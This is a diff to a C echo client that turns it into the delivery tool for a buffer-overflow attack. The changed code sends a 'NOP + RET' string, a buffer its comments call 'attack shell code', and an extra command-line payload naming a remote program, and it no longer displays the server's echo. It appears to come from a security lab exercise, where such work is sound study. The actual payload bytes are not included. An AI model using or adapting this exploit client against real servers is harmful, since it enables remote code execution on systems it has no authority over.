@@ -24,8 +24,8 @@ int main(int argc, char *argv[])
   struct hostent *he;
   struct sockaddr_in their_addr; // connector's address information 
 
-  if (argc != 4) {
-    fprintf(stderr,"usage: echo_client hostname echo_string environment_string\n");
+  if (argc != 5) {
+    fprintf(stderr,"usage: echo_client hostname echo_string environment_string remote_prog\n");
     exit(1);
   }
 
@@ -57,7 +57,7 @@ int main(int argc, char *argv[])
   if (send(sockfd, (char*) &length, sizeof(length), 0) == -1)
     perror("send");
 
-  // Send string
+  // Send (NOP + RET) string
   printf("Sending %d bytes\n", buf1len);
   if (send(sockfd, buf1, buf1len, 0) == -1)
     perror("send");
@@ -70,9 +70,23 @@ int main(int argc, char *argv[])
     perror("send");
 
   printf("Sending %d bytes\n", buf2len);
+  // Send attack shell code
   if (send(sockfd, buf2, buf2len, 0) == -1)
     perror("send");
 
+  char * buf3 = argv[4];
+  int buf3len = strlen(buf3);
+  length = htonl(buf3len);
+  // Send length
+  if (send(sockfd, (char*) &length, sizeof(length), 0) == -1)
+    perror("send");
+
+  printf("Sending %d bytes\n", buf3len);
+  // Send attack shell code
+  if (send(sockfd, buf3, buf3len, 0) == -1)
+    perror("send");
+
+  // Receive echo string from server
   if ((numbytes=recv(sockfd, buf, MAXDATASIZE-1, 0)) == -1) {
     perror("recv");
     exit(1);
@@ -80,7 +94,7 @@ int main(int argc, char *argv[])
 
   buf[numbytes] = '\0';
 
-  printf("Received: %s\n",buf);
+  printf("Received %d bytes from server\n", numbytes);
 
   close(sockfd);
 
